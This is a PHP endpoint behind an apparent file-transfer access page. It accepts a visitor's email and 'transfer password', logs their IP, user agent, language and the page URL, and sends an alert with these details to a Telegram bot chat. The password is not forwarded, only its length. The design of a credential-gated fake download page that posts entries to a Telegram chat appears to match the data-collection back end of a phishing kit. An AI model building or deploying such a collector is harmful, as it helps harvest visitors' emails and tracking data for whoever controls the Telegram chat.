<?php

declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

function json_response(int $status, array $payload): void
{
    http_response_code($status);
    echo json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function html_value(string $value): string
{
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function has_placeholder(string $value): bool
{
    return strpos($value, 'COLLE_ICI') !== false;
}

function visitor_ip(): string
{
    $headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR',
        'REMOTE_ADDR',
    ];

    foreach ($headers as $header) {
        if (empty($_SERVER[$header])) {
            continue;
        }

        $value = (string) $_SERVER[$header];
        if ($header === 'HTTP_X_FORWARDED_FOR') {
            $value = trim(explode(',', $value)[0]);
        }

        if (filter_var($value, FILTER_VALIDATE_IP)) {
            return $value;
        }
    }

    return 'unknown';
}

function send_telegram_message(string $token, string $chatId, string $message): bool
{
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($payload),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 8,
            CURLOPT_TIMEOUT => 15,
        ]);

        $result = curl_exec($ch);
        $error = curl_error($ch);
        $status = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        curl_close($ch);

        return $result !== false && $error === '' && $status >= 200 && $status < 300;
    }

    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($payload),
            'timeout' => 15,
        ],
    ]);

    return @file_get_contents($url, false, $context) !== false;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    json_response(405, ['ok' => false, 'error' => 'method_not_allowed']);
}

$configPath = dirname(__DIR__) . '/config.telegram.php';
if (!is_file($configPath)) {
    json_response(500, ['ok' => false, 'error' => 'missing_config']);
}

$config = require $configPath;
if (!is_array($config)) {
    json_response(500, ['ok' => false, 'error' => 'invalid_config']);
}

$botToken = trim((string) ($config['bot_token'] ?? ''));
$chatId = trim((string) ($config['chat_id'] ?? ''));

if ($botToken === '' || $chatId === '' || has_placeholder($botToken) || has_placeholder($chatId)) {
    json_response(500, ['ok' => false, 'error' => 'telegram_not_configured']);
}

$rawBody = file_get_contents('php://input') ?: '';
$data = json_decode($rawBody, true);
if (!is_array($data)) {
    json_response(400, ['ok' => false, 'error' => 'invalid_json']);
}

$email = strtolower(trim((string) ($data['email'] ?? '')));
$transferPassword = (string) ($data['transferPassword'] ?? '');
$language = trim((string) ($data['language'] ?? 'unknown'));
$pageUrl = trim((string) ($data['pageUrl'] ?? 'unknown'));
$fileName = trim((string) ($data['fileName'] ?? 'unknown'));

if (!filter_var($email, FILTER_VALIDATE_EMAIL) || $transferPassword === '') {
    json_response(400, ['ok' => false, 'error' => 'missing_fields']);
}

$ip = visitor_ip();
$userAgent = substr((string) ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown'), 0, 500);

$message = "🔐 <b>Nouvelle demande d'acces au fichier</b>\n\n"
    . "📁 <b>Fichier</b>\n"
    . "• Nom : <code>" . html_value($fileName) . "</code>\n\n"
    . "🧾 <b>Identifiants du transfert</b>\n"
    . "• Email autorise saisi : <code>" . html_value($email) . "</code>\n"
    . "• Mot de passe du transfert : <code>recu, non affiche dans Telegram</code>\n"
    . "• Longueur du mot de passe : <code>" . strlen($transferPassword) . "</code>\n\n"
    . "🌍 <b>Visiteur</b>\n"
    . "• IP : <code>" . html_value($ip) . "</code>\n"
    . "• User-Agent : <code>" . html_value($userAgent) . "</code>\n"
    . "• Langue : <code>" . html_value($language) . "</code>\n\n"
    . "🔗 <b>Page</b>\n"
    . "<code>" . html_value($pageUrl) . "</code>\n\n"
    . "🕒 <b>Date</b> : <code>" . gmdate('c') . "</code>";

if (!send_telegram_message($botToken, $chatId, $message)) {
    json_response(502, ['ok' => false, 'error' => 'telegram_failed']);
}

json_response(200, ['ok' => true, 'requestSent' => true]);
